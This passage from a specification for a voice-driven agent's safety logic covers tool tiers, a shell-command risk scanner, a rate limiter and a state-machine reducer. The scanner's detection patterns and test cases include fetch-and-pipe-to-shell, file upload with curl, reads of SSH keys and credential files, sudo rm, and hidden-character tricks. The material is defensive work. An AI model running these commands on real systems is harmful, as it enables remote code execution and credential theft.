| T4 | `now_playing` | `.t0` | explicit |
| T5 | `TIME` | `.t0` | explicit |
| T6 | `read_file` | `.t2` | word `read` |
| T7 | `list_files` | `.t2` | word `list` |
| T8 | `write_file` | `.t2` | word `write` |
| T9 | `patch` | `.t2` | word `patch` |
| T10 | `delete_file` | `.t2` | word `delete` |
| T11 | `create_note` | `.t2` | word `create` |
| T12 | `kill_process` | `.t2` | word `kill` |
| T13 | `terminal` | `.t3` | step 4 |
| T14 | `execute_code` | `.t3` | step 4 |
| T15 | `web_search` | `.t3` | step 4 |
| T16 | `browser_navigate` | `.t3` | step 4 |
| T17 | `computer_use` | `.t3` | step 4 |
| T18 | `send_message` | `.t3` | step 4 |
| T19 | `cron_create` | `.t3` | `cron` (step 4) beats `create` (step 5) |
| T20 | `mcp__notion__notion-search` | `.t3` | `mcp`, `search` |
| T21 | `interseptor_send_request` | `.t4` | marker `interseptor` |
| T22 | `vault_read` | `.t4` | marker `vault` beats word `read` |
| T23 | `ssh_exec` | `.t4` | marker `ssh` |
| T24 | `keychain_get` | `.t4` | marker `keychain` |
| T25 | `read_env_token` | `.t4` | marker `token` |
| T26 | `hermes_config_edit` | `.t4` | marker `hermes` |
| T27 | `finding_create` | `.t4` | marker `finding` |
| T28 | `unknown_tool_xyz` | `.t3` | default-deny |
| T29 | `` (empty) | `.t3` | empty |
| T30 | `   ` (spaces) | `.t3` | blank |
| T31 | `time_travel` | `.t3` | not equal to `time`; no known word; default-deny |
| T32 | `Clock ` (trailing space) | `.t3` | not an exact match after lowercasing (no trimming for the equality test) |

#### 2c. `Logic/CommandRiskScanner.swift`: `CommandRiskScanner`

```swift
static func scan(_ command: String, displayLimit: Int = 2000) -> CommandRisk
```

`CommandRisk` and `RiskFlags` are in `Contracts/VoiceTypes.swift`. The scanner decides what an approval card may show
and whether it may be approved at all. Algorithm:

1. **Sanitize** `command` scalar by scalar into `sanitized`:
   - Remove (and set `.hiddenCharacters`): control scalars U+0000...U+0008, U+000B, U+000C, U+000E...U+001F, U+007F...U+009F;
     and the format/bidi scalars U+00AD, U+061C, U+200B...U+200F, U+202A...U+202E, U+2060...U+2064, U+2066...U+2069, U+FEFF.
   - U+0009 (tab) becomes one space.
   - U+000A and U+000D (newline, carriage return) each become the three characters `" ⏎ "` (space, U+23CE, space) and set `.chaining`. A `\r\n` pair is two newlines, which is fine.
   - Then trim leading/trailing whitespace. If the result is empty -> return `CommandRisk(flags: [.unscanned], sanitized: "", wasTruncated: false, tier: .t4)`.
2. **Detect on the full sanitized text** (before truncation, so a long prefix can never hide a payload). `lowered = sanitized.lowercased()`:
   - `.pipeToInterpreter`: regex `\|\s*(sudo\s+)?(env\s+)?((ba|z|da|k|c|tc)?sh|python[0-9.]*|perl|ruby|node|php|osascript|source)\b`
   - `.base64Decode`: regex `\bbase64\s+(-d|-D|--decode)\b` or `\bb64decode\b`
   - `.evalUse`: regex `\beval\b`
   - `.commandSubstitution`: `lowered.contains("$(")` or `lowered.contains("`")`
   - `.sudo`: regex `\b(sudo|doas)\b`
   - `.protectedPath`: `lowered.contains` any of `.hermes, .ssh, .env, auth.json, keychain, id_rsa, id_ed25519, .aws/, .gnupg, interseptor, vault, engagements, sudoers, /etc/shadow`
   - `.chaining` (also already set by newlines): `lowered.contains(";")`, `"&&"` or `"||"`
   - `.pipe`: regex `(?<!\|)\|(?!\|)` (a single pipe, not `||`)
   - `.redirect`: contains `>` or `<`
   - `.url` (network egress): regex `\b(https?|ftp|sftp)://` or `\b(curl|wget|scp|rsync|nc|ncat|netcat|ftp|sftp|telnet|nmap)\b` or `\bgit\s+push\b` or `(?:^|[\s;&|])ssh\s` (the `ssh` command, but not the `.ssh` directory)
   - `.destructive`: regex `\b(rm|rmdir|mv|kill|killall|pkill|chmod|chown|dd|mkfs|truncate|shred|diskutil)\b`
   Use exactly these raw-string pattern constants with `text.range(of: pattern, options: .regularExpression) != nil` (they are
   verified against all 33 worked examples below; do not use `try!` or `NSRegularExpression`):

   ```swift
   private enum Pat {
       static let pipeToInterpreter = #"\|\s*(sudo\s+)?(env\s+)?((ba|z|da|k|c|tc)?sh|python[0-9.]*|perl|ruby|node|php|osascript|source)\b"#
       static let base64Flag = #"\bbase64\s+(-d|-D|--decode)\b"#
       static let b64decode = #"\bb64decode\b"#
       static let evalUse = #"\beval\b"#
       static let sudo = #"\b(sudo|doas)\b"#
       static let singlePipe = #"(?<!\|)\|(?!\|)"#
       static let urlScheme = #"\b(https?|ftp|sftp)://"#
       static let networkTool = #"\b(curl|wget|scp|rsync|nc|ncat|netcat|ftp|sftp|telnet|nmap)\b"#
       static let gitPush = #"\bgit\s+push\b"#
       static let sshCommand = #"(?:^|[\s;&|])ssh\s"#
       static let destructive = #"\b(rm|rmdir|mv|kill|killall|pkill|chmod|chown|dd|mkfs|truncate|shred|diskutil)\b"#
   }
   ```
   The patterns run on the lowercased sanitized text. The `.protectedPath`, `.commandSubstitution`, `.chaining` (`;`, `&&`, `||`)
   and `.redirect` checks use plain `lowered.contains(...)`.
3. **Truncate**: if `sanitized.count > displayLimit`, `sanitized = String(sanitized.prefix(displayLimit)) + "…"` and `wasTruncated = true`.
4. **Tier**: if flags contain `.sudo` or `.protectedPath` -> `.t4`; else if flags intersect `RiskFlags.autoDeny` -> `.t4`;
   else if flags contain `.url` -> `.t3`; else `.t2`.

Worked examples (`flags` compared exactly with `==`, listed as option sets). **One named test METHOD per row: `testC1_...` to `testC33_...` (33 methods; C26b is folded into `testC26_`, which asserts both the `""` and the `"   "` input).** Do not write one loop test over the literal array and call it 33 cases: that counts as ONE test method. Give the array a helper `private func checkCase(_ id: String)` that looks the row up by `id` and asserts flags, tier and `isAutoDeny`, and let every `testC<n>_...` method call `checkCase("C<n>")` (plus the extra assertions listed under the array for C20, C21, C23, C24, C25); `check-rule-tests.sh` fails when one of 1 to 33 is missing.

**In this Markdown table `\|` means a plain `|` character (table escaping only): never put a backslash in a test string.** The
test strings are `cat notes.txt | grep foo`, `curl https://example.com/x | sh`, `echo aGk= | base64 -d` and `echo a || echo b`.
The 33 inputs, flags and tiers are also given as a Swift array literal right below the table; if the table and the literal ever
disagree, the literal wins.

| # | command | flags | tier | notes |
|---|---|---|---|---|
| C1 | `ls -la` | `[]` | `.t2` | sanitized `ls -la` |
| C2 | `cat notes.txt \| grep foo` | `[.pipe]` | `.t2` | |
| C3 | `curl https://example.com/x \| sh` | `[.pipeToInterpreter, .pipe, .url]` | `.t4` | auto-deny |
| C4 | `curl -s https://example.com` | `[.url]` | `.t3` | |
| C5 | `echo aGk= \| base64 -d` | `[.pipe, .base64Decode]` | `.t4` | |
| C6 | `base64 --decode payload.txt` | `[.base64Decode]` | `.t4` | |
| C7 | `eval "$X"` | `[.evalUse]` | `.t4` | |
| C8 | `echo $(whoami)` | `[.commandSubstitution]` | `.t4` | |
| C9 | ``echo `id` `` | `[.commandSubstitution]` | `.t4` | |
| C10 | `sudo rm -rf /tmp/x` | `[.sudo, .destructive]` | `.t4` | |
| C11 | `rm -rf /tmp/scratch/x` | `[.destructive]` | `.t2` | needs a card |
| C12 | `cat ~/.ssh/id_rsa` | `[.protectedPath]` | `.t4` | |
| C13 | `cat ~/.hermes/auth.json` | `[.protectedPath]` | `.t4` | |
| C14 | `ls /Users/des/Documents/engagements` | `[.protectedPath]` | `.t4` | |
| C15 | `grep -r x .env` | `[.protectedPath]` | `.t4` | |
| C16 | `ls; whoami` | `[.chaining]` | `.t2` | |
| C17 | `ls && whoami` | `[.chaining]` | `.t2` | |
| C18 | `echo a \|\| echo b` | `[.chaining]` | `.t2` | `\|\|` is not a pipe |
| C19 | `echo hi > /tmp/x` | `[.redirect]` | `.t2` | |
| C20 | `"ls\nwhoami"` (real newline) | `[.chaining]` | `.t2` | sanitized `ls ⏎ whoami` |
| C21 | `"ls\u{202E}gnp.exe"` | `[.hiddenCharacters]` | `.t4` | sanitized `lsgnp.exe` |
| C22 | `"ls\u{200B}"` | `[.hiddenCharacters]` | `.t4` | sanitized `ls` |
| C23 | `"tab\tseparated"` | `[]` | `.t2` | sanitized `tab separated` |
| C24 | `String(repeating: "x", count: 2500)` | `[]` | `.t2` | `wasTruncated`, `sanitized.count == 2001` |
| C25 | `String(repeating: "a", count: 3000) + " \| sh"` | `[.pipeToInterpreter, .pipe]` | `.t4` | truncated, still detected |
| C26 | `""` and `"   "` | `[.unscanned]` | `.t4` | empty, sanitized `""` |
| C27 | `python3 -c 'print(1)'` | `[]` | `.t2` | |
| C28 | `curl -d @file https://x` | `[.url]` | `.t3` | |
| C29 | `git push origin main` | `[.url]` | `.t3` | |
| C30 | `nmap -sV 10.0.0.1` | `[.url]` | `.t3` | |
| C31 | `cd ~/Downloads && ls` | `[.chaining]` | `.t2` | |
| C32 | `ls` + `"\u{0007}"` (bell) | `[.hiddenCharacters]` | `.t4` | |
| C33 | `ssh user@host` | `[.url]` | `.t3` | the `ssh` command, not `.ssh` |

```swift
// Copy this into CommandRiskScannerTests.swift. C24 and C25 also assert wasTruncated == true; C24 asserts sanitized.count == 2001;
// C20 asserts sanitized == "ls \u{23CE} whoami"; C21 asserts sanitized == "lsgnp.exe"; C23 asserts sanitized == "tab separated".
private let scannerCases: [(id: String, input: String, flags: RiskFlags, tier: VoiceTier)] = [
    ("C1", "ls -la", [], .t2),
    ("C2", "cat notes.txt | grep foo", [.pipe], .t2),
    ("C3", "curl https://example.com/x | sh", [.pipeToInterpreter, .pipe, .url], .t4),
    ("C4", "curl -s https://example.com", [.url], .t3),
    ("C5", "echo aGk= | base64 -d", [.pipe, .base64Decode], .t4),
    ("C6", "base64 --decode payload.txt", [.base64Decode], .t4),
    ("C7", "eval \"$X\"", [.evalUse], .t4),
    ("C8", "echo $(whoami)", [.commandSubstitution], .t4),
    ("C9", "echo `id`", [.commandSubstitution], .t4),
    ("C10", "sudo rm -rf /tmp/x", [.sudo, .destructive], .t4),
    ("C11", "rm -rf /tmp/scratch/x", [.destructive], .t2),
    ("C12", "cat ~/.ssh/id_rsa", [.protectedPath], .t4),
    ("C13", "cat ~/.hermes/auth.json", [.protectedPath], .t4),
    ("C14", "ls /Users/des/Documents/engagements", [.protectedPath], .t4),
    ("C15", "grep -r x .env", [.protectedPath], .t4),
    ("C16", "ls; whoami", [.chaining], .t2),
    ("C17", "ls && whoami", [.chaining], .t2),
    ("C18", "echo a || echo b", [.chaining], .t2),
    ("C19", "echo hi > /tmp/x", [.redirect], .t2),
    ("C20", "ls\nwhoami", [.chaining], .t2),
    ("C21", "ls\u{202E}gnp.exe", [.hiddenCharacters], .t4),
    ("C22", "ls\u{200B}", [.hiddenCharacters], .t4),
    ("C23", "tab\tseparated", [], .t2),
    ("C24", String(repeating: "x", count: 2500), [], .t2),
    ("C25", String(repeating: "a", count: 3000) + " | sh", [.pipeToInterpreter, .pipe], .t4),
    ("C26", "", [.unscanned], .t4),
    ("C26b", "   ", [.unscanned], .t4),
    ("C27", "python3 -c 'print(1)'", [], .t2),
    ("C28", "curl -d @file https://x", [.url], .t3),
    ("C29", "git push origin main", [.url], .t3),
    ("C30", "nmap -sV 10.0.0.1", [.url], .t3),
    ("C31", "cd ~/Downloads && ls", [.chaining], .t2),
    ("C32", "ls\u{0007}", [.hiddenCharacters], .t4),
    ("C33", "ssh user@host", [.url], .t3)
]
```

`CommandRisk.isAutoDeny` (already implemented in the contract) must be true exactly for C3, C5-C10, C12-C15, C21, C22, C25, C26, C32.

#### 2d. `Logic/RateLimiter.swift`: `RateLimiter.tryConsume`

Replace only the body of `tryConsume`; keep the struct's stored properties (`t1Events`, `t2Events`).

```swift
mutating func tryConsume(tier: VoiceTier, now: Date) -> RateVerdict
```

- `.t0` and `.t4`: return `.allowed` and record nothing.
- `.t1`: bucket `t1Events`, window **60 s**, limit `VoiceLimits.t1PerMinute` (10).
- `.t2` and `.t3`: bucket `t2Events` (shared), window **600 s**, limit `VoiceLimits.t2PerTenMinutes` (3).
- Algorithm: drop events with `now.timeIntervalSince(event) >= window` (an event exactly one window old is dropped).
  If `events.count >= limit`: return `.limited(retryAfter: events.min()!.addingTimeInterval(window).timeIntervalSince(now))`
  and do NOT record. Otherwise append `now` and return `.allowed`.

Each row is its OWN test method named `testL<n>_<slug>` (`testL1_` ... `testL11_`; `check-rule-tests.sh` enforces 1 to 11). Rows L1 to L4 and L5 to L7 describe one continuing sequence each: a method for a later row replays the earlier steps itself (a `private func` helper that builds the state), so every method is independent.

| # | Scenario | Expected |
|---|---|---|
| L1 | 10 `.t1` consumes at t = 1000, 1001, ..., 1009 | all `.allowed` |
| L2 | 11th `.t1` at t = 1010 | `.limited(retryAfter: 50)` |
| L3 | then `.t1` at t = 1059.5 | `.limited(retryAfter: 0.5)` |
| L4 | then `.t1` at t = 1060 | `.allowed` (the t = 1000 event is exactly 60 s old and is dropped) |
| L5 | `.t2` at t = 0, 100, 200 | `.allowed` x3 |
| L6 | `.t2` at t = 300 | `.limited(retryAfter: 300)` |
| L7 | `.t2` at t = 600 | `.allowed` |
| L8 | `.t3` after three `.t2` within 600 s | `.limited` (shared bucket) |
| L9 | a refused call leaves `t1Events` / `t2Events` unchanged | assert counts |
| L10 | `.t1` full does not affect `.t2` | independent windows |
| L11 | `.t0` and `.t4` 100 times | always `.allowed`, both arrays stay empty |

## Step 3 and 4: the reducer

`Logic/VoiceReducer.swift`. This is the session state machine. (CI's SwiftLint is stricter than `lint-lite.sh`: in the big `switch` write `case .foo`, never `case .foo(_)`, and bind with `if case .foo = x`, never `if let _ = x`.) Read `VoiceContext`, `VoiceEvent`, `VoiceEffect` in the contract
first. Do Step 3 (everything up to and including R79, plus R95-R97, R110-R132 and the global rules) and run its tests; then
Step 4 (R80-R92 and R100-R105) and run all reducer tests.

#### Reducer signature

```swift
// Sources/DesnotchCore/Voice/Logic/VoiceReducer.swift  (stub exists; WP-LOGIC fills it in)
enum VoiceReducer {
    static func reduce(_ context: VoiceContext, _ event: VoiceEvent, env: VoiceReducerEnv) -> VoiceTransition
}
```

`reduce` is a pure function: no clock (`env.now`), no randomness (`env.freshNonce`), no I/O, no global
state. The literal seconds in the rules below ARE the contract constants: 0.35 = `VoiceTiming.holdThreshold`, 1.5 = `reviewWindow`,
5.0 = `finalWatchdog`, 30.0 = `holdListenCap`, 10.0 = `toggleListenCap` (also the interrupt capture's cap), 60.0 = `approvalTimeout`,
3.0 = `errorDisplay`, 6.0 = `replyDisplay`, 180.0 = `agentTurnBudget`, 12 = `VoiceLimits.maxAgentSteps`; code may use either form (the
constants are preferred) and a test asserts they agree (WP-LOGIC, "Rule tests"). It returns the next `VoiceContext` and the ordered list of `VoiceEffect`s. Anything not
listed in the rules below is a **no-op**: return `VoiceTransition(context: context, effects: [])`
(the unchanged context).

#### Vocabulary (all types are in `Contracts/VoiceTypes.swift`)

States: `idle, armed, listening, transcribing, review, thinking, acting, awaitingApproval, speaking, error, paused`.

Events: `talkPressed, talkReleased(heldSeconds:), toggleTalk, cancelRequested, stopAllRequested,
resumeRequested, approveRequested(nonce:), denyRequested(nonce:), screenLocked, featureDisabled,
captureStarted(generation:), captureFailed(_:generation:), partialTranscript(_:generation:),
finalTranscript(_:generation:), timerElapsed(_:generation:), localExecutionFinished(_:generation:),
speechFinished(generation:), agent(_:generation:)`.

Effects: `startCapture(generation:mode:), endCapture(generation:), cancelCapture(generation:),
startTimer(_:generation:seconds:), cue(_:), execute(_:generation:), submitToAgent(utterance:generation:),
respondToApproval(nonce:allow:), cancelAgentTurn, stopAgentHard, speak(_:generation:), stopSpeaking, audit(_:)`.

#### Named procedures

Every rule below is built from these. `next` is a copy of the incoming context; `effects` starts empty.
"Append" always means "to the end of the effects list, in the order written".

| Procedure | Exact meaning |
|---|---|
| `CLEAR_FLOW` | `partialTranscript = ""`, `finalTranscript = ""`, `route = nil`, `pending = nil`, `pendingIntent = nil`, `failure = nil`, `pauseReason = nil`, `reply = ""`, `steps = []`, `stepsStarted = 0`, `approvedToolStarts = 0`, `lane = nil`, `captureEndedByUser = false`. Does NOT touch `counter`, `generation`, `captureMode`, `interrupt`, `rate`, `state`. |
| `NEW_ID` | `counter += 1; generation = counter`. Makes every in-flight async event of the old flow stale. |
| `DROP_INTERRUPT` | If `interrupt != nil`: append `.cancelCapture(generation: interrupt.generation)` and set `interrupt = nil`. |
| `TO_IDLE(extra)` | `effects = extra`; `DROP_INTERRUPT`; `NEW_ID`; `CLEAR_FLOW`; `state = .idle`. |
| `TO_ERROR(f, extra)` | `effects = extra`; `DROP_INTERRUPT`; `state = .error`; `failure = f`; `pending = nil`; `pendingIntent = nil`; `partialTranscript = ""`; append `.cue(.error)`, `.startTimer(.errorDisplay, generation: next.generation, seconds: 3.0)`, `.audit(AuditDraft(kind: .error, lane: next.lane, decision: "failure", outcome: f.code))`. Does NOT call `NEW_ID` (the display timer must carry the current generation). `finalTranscript` is kept so the error can say what was heard. |
| `STOP_ALL(reason)` | `wasBusy = (state.isAgentBusy && lane == .hermes)`. Effects, **appended to the current `effects` list** (STOP_ALL never clears it, so whatever the caller already put there stays first), in this order: (1) if state is `armed/listening/transcribing`: `.cancelCapture(generation)`; (2) if `interrupt != nil`: `.cancelCapture(interrupt.generation)`; (3) if state is `speaking`: `.stopSpeaking`; (4) if `wasBusy`: `.stopAgentHard`; (5) `.audit(AuditDraft(kind: .stop, lane: lane, decision: auditName(reason), outcome: wasBusy ? "hard" : "soft"))`. Then `interrupt = nil`; `NEW_ID`; `CLEAR_FLOW`; if `wasBusy`: `state = .paused`, `pauseReason = reason` else `state = .idle`. `reason` is a `PauseReason`. **`PauseReason` has NO `auditName` member and the frozen contract type must not be extended.** In `VoiceReducer.swift` write the mapping yourself as a private helper: `private func auditName(_ r: PauseReason) -> String { switch r { case .userStop: return "user_stop"; case .spokenAbort: return "spoken_abort"; case .tripwire: return "tripwire" } }`. Worked example (R35: state `listening`, generation 1, final text "abort agent", so HANDLE_FINAL's `prefix` is already in `effects`): `[.endCapture(generation: 1), .cue(.captureEnd), .cancelCapture(generation: 1), .audit(AuditDraft(kind: .stop, lane: nil, decision: "spoken_abort", outcome: "soft"))]`, state `.idle`. |
| `CANCEL_CAPTURE(auditDecision)` | `TO_IDLE([.cancelCapture(generation: generation), .audit(AuditDraft(kind: .cancel, lane: lane, decision: auditDecision))])`. (`generation` is the value BEFORE `NEW_ID`.) |
| `END_BY_USER` | `state = .transcribing`; `captureEndedByUser = true`; append `.endCapture(generation)`, `.cue(.captureEnd)`, `.startTimer(.finalWatchdog, generation: generation, seconds: 5.0)`. |
| `END_BY_CAP` | Same as `END_BY_USER` but `captureEndedByUser` stays `false`. |
| `NEW_FLOW(mode, extra)` | `effects = extra`; `NEW_ID`; `CLEAR_FLOW`; `captureMode = mode`; `state = .armed`; append `.startCapture(generation: next.generation, mode: mode)`. |
| `HANDLE_FINAL(text, prefix)` | See "Final transcript handling" below. `prefix` is an effects list that every outcome puts first. |
| `ENTER_REVIEW(route, lane, prefix)` | `effects = prefix`; `state = .review`; `next.route = route`; `next.lane = lane`; append `.cue(.commit)`, `.startTimer(.review, generation: generation, seconds: 1.5)`, `.audit(AuditDraft(kind: .route, lane: lane, decision: "pending", transcript: finalTranscript))`. |
| `FINISH(text)` | `reply = String(text.prefix(400))`; `pending = nil`; `pendingIntent = nil`; `DROP_INTERRUPT`; `state = .speaking`; if `env.speechAllowed && !reply.isEmpty` append `.speak(reply, generation: generation)` else append `.startTimer(.replyDisplay, generation: generation, seconds: 6.0)`; then append `.cue(.done)`, `.audit(AuditDraft(kind: .execute, lane: lane, decision: "finished", outcome: "ok"))`. |

`bounded(s)` = `String(s.prefix(500))` for transcripts. Strings are compared and prefixed by `Character`, not bytes.

#### Stale events (rule R01)

An event with a `generation` payload is **current** when `generation == context.generation`, or
(`context.interrupt != nil` and `generation == context.interrupt!.generation`). A non-current event is
a no-op, with exactly one exception: `.agent(.usage(...), generation:)` always yields
`[.audit(AuditDraft(kind: .cost, counters: [...]))]` (see R88) even when stale, so cost accounting is
never lost.

#### Final transcript handling (`HANDLE_FINAL(text)`)

Used by R35 (with `prefix = [.endCapture(generation: generation), .cue(.captureEnd)]`, because the recognizer ended the
capture on its own and the coordinator must close the microphone) and by R40 (with `prefix = []`). In order:

1. `t = text` trimmed of whitespace and newlines. `finalTranscript = bounded(t)`. `partialTranscript = ""`.
2. `t.isEmpty` -> `TO_ERROR(.noSpeech, prefix)` (rule R50).
3. `env.screenLocked` -> `TO_ERROR(.screenLocked, prefix + [.audit(AuditDraft(kind: .lock, decision: "blocked"))])` (R51).
4. `route = IntentRouter.route(t, context: RouterContext(hermesLaneAvailable: env.hermesLaneReady, agentBusy: false))`.
5. By `route`:

| Rule | Route | Result |
|---|---|---|
| R52 | `.emergencyStop` | `prefix`, then `STOP_ALL(.spokenAbort)` (the state is not busy here, so it ends `idle`; its effects include `.cancelCapture(generation:)` because the state is still `listening`/`transcribing`, which is harmless). |
| R53 | `.reject(r)` | `TO_ERROR(.rejected(r), prefix + [.audit(AuditDraft(kind: .route, decision: "reject", outcome: r.rawValue, transcript: t))])`. |
| R54 | `.remote` and `captureEndedByUser == false` | `TO_ERROR(.rejected(.needsUserRelease), prefix)`. |
| R55 | `.remote` and `env.hermesTurnsRemainingToday <= 0` | `TO_ERROR(.dailyCapReached, prefix)`. |
| R56 | `.remote` (otherwise) | `ENTER_REVIEW(route, .hermes, prefix)`. |
| R57 | `.local` | `ENTER_REVIEW(route, .local, prefix)`. |
| R58 | `.cancelTurn` | `TO_IDLE(prefix)` (defensive: cannot happen when `agentBusy` is false). |

#### Transition rules

Rules are evaluated per (state, event). **R01 first**, then the global rules R02-R04, then the rules of the
current state. The first rule whose guard holds wins. IDs are stable: tests are named after them
(`testR31_...`).

**Global**

| ID | State | Event [guard] | Result |
|---|---|---|---|
| R01 | any | any event with a `generation` that is not current | no-op (exception: `.agent(.usage)`, see R88) |
| R02 | any | `featureDisabled` | If `state == .idle && interrupt == nil`: no-op. Otherwise `STOP_ALL(.userStop)` with exactly two overrides: the result state is ALWAYS `.idle` (never `.paused`; keep `pauseReason = nil`), and the audit `decision` is `"disabled"` instead of `"user_stop"`. Everything else is STOP_ALL unchanged: the audit `outcome` is still `wasBusy ? "hard" : "soft"`, and `.stopAgentHard` is still emitted when `wasBusy`. |
| R03 | `paused` | `stopAllRequested` | no-op |
| R03a | `idle` with `interrupt == nil` | `stopAllRequested` | effects `[.audit(AuditDraft(kind: .stop, decision: "user_stop", outcome: "idle"))]`, context unchanged |
| R03b | any other | `stopAllRequested` | `STOP_ALL(.userStop)` |
| R04 | `armed, listening, transcribing, review` | `screenLocked` | same as the `cancelRequested` rule of that state, with audit decision `"locked"` (R24, R37, R43, R65) |
| R04a | `awaitingApproval` | `screenLocked` | same as R78 (deny), audit decision `"locked"` |
| R04b | `idle, thinking, acting, speaking, error, paused` | `screenLocked` | no-op (a running agent turn is not killed by a lock; new input is refused by R13 in `idle`, and an approval is refused by R70 while locked) |

**idle**

| ID | Event [guard] | Result |
|---|---|---|
| R10 | `talkPressed` [`env.voiceEnabled && !env.screenLocked`] | `NEW_FLOW(.hold, [])` |
| R11 | `toggleTalk` [`env.voiceEnabled && !env.screenLocked`] | `NEW_FLOW(.toggle, [])` |
| R12 | `talkPressed` or `toggleTalk` [`!env.voiceEnabled`] | no-op |
| R13 | `talkPressed` or `toggleTalk` [`env.voiceEnabled && env.screenLocked`] | `NEW_ID`, `CLEAR_FLOW`, then `TO_ERROR(.screenLocked, [.audit(AuditDraft(kind: .lock, decision: "blocked"))])` |
| R14 | anything else | no-op (this includes `talkReleased`, `cancelRequested`, `resumeRequested`, approve/deny, late timers) |

**armed** (key is down, waiting for the first audio buffer)

| ID | Event [guard] | Result |
|---|---|---|
| R20 | `captureStarted` | `state = .listening`; append `.cue(.captureStart)`, `.startTimer(.listenCap, generation: generation, seconds: captureMode == .hold ? 30.0 : 10.0)` |
| R21 | `talkReleased(h)` [`captureMode == .hold && h >= 0.35`] | `CANCEL_CAPTURE("released_early")` (the key came up before the mic opened) |
| R22 | `talkReleased(h)` [`captureMode == .hold && h < 0.35`] | `captureMode = .toggle` (a tap latches); stay `armed`; no effects |
| R23 | `captureFailed(f)` | `TO_ERROR(f, [.cancelCapture(generation: generation)])` |
| R24 | `cancelRequested` | `CANCEL_CAPTURE("cancel")` |

**listening**

| ID | Event [guard] | Result |
|---|---|---|
| R30 | `partialTranscript(s)` (also in `armed` and `transcribing`) | `partialTranscript = bounded(s)`; no effects |
| R31 | `talkReleased(h)` [`captureMode == .hold && h >= 0.35`] | `END_BY_USER` |
| R32 | `talkReleased(h)` [`captureMode == .hold && h < 0.35`] | `captureMode = .toggle`; append `.startTimer(.listenCap, generation: generation, seconds: 10.0)` |
| R33 | `toggleTalk` (any mode), or `talkPressed` [`captureMode == .toggle`] | `END_BY_USER`. (`talkPressed` in `.hold` mode is key repeat: no-op.) |
| R34 | `timerElapsed(.listenCap)` | `END_BY_CAP` |
| R35 | `finalTranscript(s)` (the recognizer ended on its own) | `HANDLE_FINAL(s, prefix: [.endCapture(generation: generation), .cue(.captureEnd)])`; `captureEndedByUser` stays `false` |
| R36 | `captureFailed(f)` | `TO_ERROR(f, [.cancelCapture(generation: generation)])` |
| R37 | `cancelRequested` | `CANCEL_CAPTURE("cancel")` |

**transcribing** (the user ended the capture; waiting for the final text)

| ID | Event [guard] | Result |
|---|---|---|
| R40 | `finalTranscript(s)` | `HANDLE_FINAL(s, prefix: [])` |
| R41 | `timerElapsed(.finalWatchdog)` | `TO_ERROR(.timeout, [.cancelCapture(generation: generation)])` |
| R42 | `captureFailed(f)` | `TO_ERROR(f, [.cancelCapture(generation: generation)])` |
| R43 | `cancelRequested` | `CANCEL_CAPTURE("cancel")` |

(`timerElapsed(.listenCap)` and `timerElapsed(.finalWatchdog)` in any other state are no-ops by default.)

**Final transcript handling** is R50-R58 above.

**review** ("heard: ..., sending in 1.5 s")

| ID | Event [guard] | Result |
|---|---|---|
| R60 | `timerElapsed(.review)` [`route == .local(i)`] | `tier = ConfirmationPolicy.tier(of: i)`; `decision = ConfirmationPolicy.decide(tier:, secondFactorAvailable: env.secondFactorAvailable)`. `.allow`: if `tier >= .t1` call `next.rate.tryConsume(tier:, now: env.now)` and on `.limited` do `TO_ERROR(.rateLimited, [.audit(AuditDraft(kind: .denial, lane: .local, tier: tier, decision: "rate_limited"))])`; otherwise `state = .acting`, append `.execute(i, generation: generation)`, `.audit(AuditDraft(kind: .execute, lane: .local, tier: tier, decision: "allow"))`. |
| R61 | `timerElapsed(.review)` [`route == .local(i)`, decision `.confirm`] | `req = ConfirmationRequest(nonce: env.freshNonce, tier: tier, source: .local, summary: i.summary, literal: i.summary)`; `pending = req`; `pendingIntent = i`; `state = .awaitingApproval`; append `.cue(.needsConfirmation)`, `.startTimer(.approval, generation: generation, seconds: 60.0)`, `.audit(AuditDraft(kind: .approval, lane: .local, tier: tier, decision: "requested"))`. |
| R62 | `timerElapsed(.review)` [`route == .local(i)`, decision `.deny(r)`] | `TO_ERROR(.denied(r), [.audit(AuditDraft(kind: .denial, lane: .local, tier: tier, decision: r.rawValue))])`. (Unreachable with the MVP catalog; implement anyway.) |
| R63 | `timerElapsed(.review)` [`route == .remote(u)`] | `rate.tryConsume(tier: .t1, now: env.now)`: `.limited` -> `TO_ERROR(.rateLimited)`. Else `lane = .hermes`; `state = .thinking`; `steps = []`; `stepsStarted = 0`; append `.submitToAgent(utterance: u, generation: generation)`, `.startTimer(.turnBudget, generation: generation, seconds: 180.0)`, `.audit(AuditDraft(kind: .submit, lane: .hermes, tier: .t1, decision: "allow"))`. |
| R64 | `timerElapsed(.review)` [any other route] | `TO_IDLE([])` (defensive) |
| R65 | `cancelRequested` | `TO_IDLE([.audit(AuditDraft(kind: .cancel, lane: lane, decision: "review"))])` |

**awaitingApproval** (an approval card is showing; `pending != nil`)

| ID | Event [guard] | Result |
|---|---|---|
| R70 | `approveRequested(n)` [`env.screenLocked`] | no-op, not even an audit line (evaluated before R71-R74) |
| R71 | `approveRequested(n)` [`pending == nil || n != pending.nonce`] | effects `[.audit(AuditDraft(kind: .approval, decision: "nonce_mismatch"))]`; context unchanged |
| R72 | `approveRequested(n)` [nonce matches, `!pending.canApprove`] | effects `[.audit(AuditDraft(kind: .approval, tier: pending.tier, decision: "blocked"))]`; context unchanged |
| R73 | `approveRequested(n)` [nonce matches, `canApprove`, `pendingIntent == i` (local)] | `tier = pending.tier`; `rate.tryConsume(tier:, now:)`: `.limited` -> `TO_ERROR(.rateLimited)`. Else `pending = nil`; `pendingIntent = nil`; `state = .acting`; effects `[.cue(.approved), .execute(i, generation: generation), .audit(AuditDraft(kind: .approval, lane: .local, tier: tier, decision: "approved"))]` |
| R74 | `approveRequested(n)` [nonce matches, `canApprove`, agent card (`pendingIntent == nil`)] | If `pending.tier >= .t2`, first `rate.tryConsume(tier: pending.tier, now: env.now)`; on `.limited` take the R77 deny path with decision `"rate_limited"`: effects `[.respondToApproval(nonce: n, allow: false), .audit(AuditDraft(kind: .denial, lane: .hermes, tier: pending.tier, decision: "rate_limited"))]`; `pending = nil`; `state = .acting`; `approvedToolStarts` unchanged (the turn stays alive and the agent finishes or fails on its own). Otherwise (tier below `.t2`, or `.allowed`): `if pending.tier >= .t2 { approvedToolStarts += 1 }`; effects `[.respondToApproval(nonce: n, allow: true), .cue(.approved), .audit(AuditDraft(kind: .approval, lane: .hermes, tier: pending.tier, decision: "approved"))]`; `pending = nil`; `state = .acting` |
| R75 | `denyRequested(n)` [`pending == nil || n != pending.nonce`] | same as R71 (audit `nonce_mismatch`, no change) |
